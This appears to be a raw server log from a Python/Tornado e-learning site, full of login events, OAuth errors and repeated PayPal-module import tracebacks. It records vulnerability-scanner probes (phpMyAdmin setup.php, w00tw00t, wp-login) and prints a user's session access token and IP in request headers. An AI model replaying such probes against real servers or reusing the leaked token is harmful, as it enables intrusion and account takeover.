ERROR:root:500 GET /test/get-next?tid=5076f01a8e4c850ee2828b5d&answers=%5B2%5D&cursor=19&_xsrf=09382964679f4272968cfad6a363f3e4 (127.0.0.1) 112.37ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 50723c268e4c855a131320d0 has successfully logged in.
INFO:intheory-8000:Facebook user with id 50723c268e4c855a131320d0 has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
WARNING:root:404 HEAD /manager/status (127.0.0.1) 0.80ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
INFO:intheory-8003:Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
WARNING:root:404 GET /wp-login.php (127.0.0.1) 0.52ms
WARNING:root:404 GET /wp-login.php (127.0.0.1) 1.18ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 0.50ms
WARNING:root:404 HEAD /manager/status (127.0.0.1) 0.80ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
WARNING:root:405 HEAD / (127.0.0.1) 0.68ms
WARNING:root:404 HEAD /manager/status (127.0.0.1) 0.79ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
WARNING:root:404 GET /bthumb/FSP/FSP029/908034.jpg (127.0.0.1) 0.79ms
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8000:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
HTTP 403: Forbidden
ERROR:intheory-8002:HTTP 403: Forbidden
WARNING:root:403 GET /admin/nuggets/get?sid=0&_xsrf=ad4a0855c4d34f09844b5b3a8c15895f (127.0.0.1) 201.38ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 0.80ms
WARNING:root:404 HEAD /manager/html (127.0.0.1) 0.85ms
WARNING:root:404 GET /payment (127.0.0.1) 0.78ms
WARNING:root:404 GET /payment (127.0.0.1) 0.79ms
WARNING:root:404 GET /payment (127.0.0.1) 1.22ms
WARNING:root:404 GET /payment (127.0.0.1) 0.78ms
WARNING:root:404 GET /payments (127.0.0.1) 1.47ms
WARNING:root:404 GET /payment (127.0.0.1) 0.77ms
WARNING:root:404 GET /payment/do?token=EC-6BD71324HW4472921&PayerID=NCXBANE5MCLSE (127.0.0.1) 0.81ms
WARNING:root:404 GET /payment/do?token=EC-6BD71324HW4472921&PayerID=NCXBANE5MCLSE (127.0.0.1) 0.81ms
WARNING:root:404 GET /manager/html (127.0.0.1) 0.77ms
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
Facebook user with id 507892738e4c8550684e7d0b has successfully logged in.
INFO:intheory-8002:Facebook user with id 507892738e4c8550684e7d0b has successfully logged in.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 0.79ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDUFViOU5wZEVaQWw2ckh4TUxZSFpCUmtTWkNVMDExT3Rubnd2Ylg5RUZtaGpFazF6OGU4ZFpCUEF4dERhQ0s5RnJPb1pCVXV2cWlHMm52SVNuOVpCYTJiSmZCOW85UVpEWkQ=|1347963440|2bf665d3a726f0b5aa3e9cdda0e0690b59617c1e"; _xsrf=3bfc475aa7374634934261809a7091dc; __utma=188782963.2116357284.1347963424.1348178970.1348219667.4; __utmz=188782963.1347963424.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '188.221.121.90'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 143.16ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDUFViOU5wZEVaQWw2ckh4TUxZSFpCUmtTWkNVMDExT3Rubnd2Ylg5RUZtaGpFazF6OGU4ZFpCUEF4dERhQ0s5RnJPb1pCVXV2cWlHMm52SVNuOVpCYTJiSmZCOW85UVpEWkQ=|1347963440|2bf665d3a726f0b5aa3e9cdda0e0690b59617c1e"; _xsrf=3bfc475aa7374634934261809a7091dc; __utma=188782963.2116357284.1347963424.1348178970.1348219667.4; __utmz=188782963.1347963424.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '188.221.121.90'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 10.04ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 507892738e4c8550684e7d0b has successfully logged in.
INFO:intheory-8000:Facebook user with id 507892738e4c8550684e7d0b has successfully logged in.
WARNING:root:404 GET /hq/public/index.php?path_info=login (127.0.0.1) 1.19ms
Section matching query does not exist.
WARNING:intheory-8002:Section matching query does not exist.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8002:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:404 GET /hq/ (127.0.0.1) 1.33ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8002:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8002:Ajax request failed.
Facebook user with id 5072cbc18e4c855a2755404f has successfully logged in.
INFO:intheory-8001:Facebook user with id 5072cbc18e4c855a2755404f has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 507892738e4c8550684e7d0b has successfully logged in.
INFO:intheory-8001:Facebook user with id 507892738e4c8550684e7d0b has successfully logged in.
WARNING:root:404 GET /l (127.0.0.1) 0.84ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8001:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
WARNING:root:404 GET /apple-touch-icon-114x114-precomposed.png (127.0.0.1) 1.73ms
WARNING:root:404 GET /apple-touch-icon-114x114.png (127.0.0.1) 1.22ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.33ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.26ms
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8000:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8002:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:root:404 GET /search/tsc.php?&ses=12932278382db1989047d2a807117686ca49c1a79d&200=Nzk0NjYyNTM=&21=NjYuMjQ5LjcyLjEzMw==&681=MTI5MzIyNzgzODJkYjE5ODkwNDdkMmE4MDcxMTc2ODZjYTQ5YzFhNzlk&682=&616=&crc=880fa1e75d8de8d6e91d575b5c2b329d0718f799&cv=1 (127.0.0.1) 1.37ms
WARNING:root:404 GET /r/ads/adcode.js (127.0.0.1) 1.98ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8000:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
WARNING:root:404 GET /h (127.0.0.1) 1.18ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 507d60738e4c85441a097f6f has successfully logged in.
INFO:intheory-8001:Facebook user with id 507d60738e4c85441a097f6f has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 507d764d8e4c85441a097f72 has successfully logged in.
INFO:intheory-8002:Facebook user with id 507d764d8e4c85441a097f72 has successfully logged in.
Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
INFO:intheory-8001:Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 507db3118e4c854410a43c44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 507db3118e4c854410a43c44 has successfully logged in.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8001:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
None is not a valid ObjectId
ERROR:intheory-8002:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8002:Ajax request failed.
WARNING:root:404 GET /h (127.0.0.1) 0.77ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (94.75.209.131) 0.53ms
WARNING:root:404 GET /cgi-bin/ (127.0.0.1) 0.80ms
WARNING:root:404 GET /w00tw00t.at.blackhats.romanian.anti-sec:) (127.0.0.1) 0.85ms
WARNING:root:404 GET /phpMyAdmin/scripts/setup.php (127.0.0.1) 0.87ms
WARNING:root:404 GET /phpmyadmin/scripts/setup.php (127.0.0.1) 0.38ms
WARNING:root:404 GET /pma/scripts/setup.php (127.0.0.1) 0.79ms
WARNING:root:404 GET /myadmin/scripts/setup.php (127.0.0.1) 0.78ms
WARNING:root:404 GET /MyAdmin/scripts/setup.php (127.0.0.1) 0.83ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
        from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    Traceback (most recent call last):
from paypal import PayPalInterface
ImportError: No module named paypal
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    from paypal import PayPalInterface
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
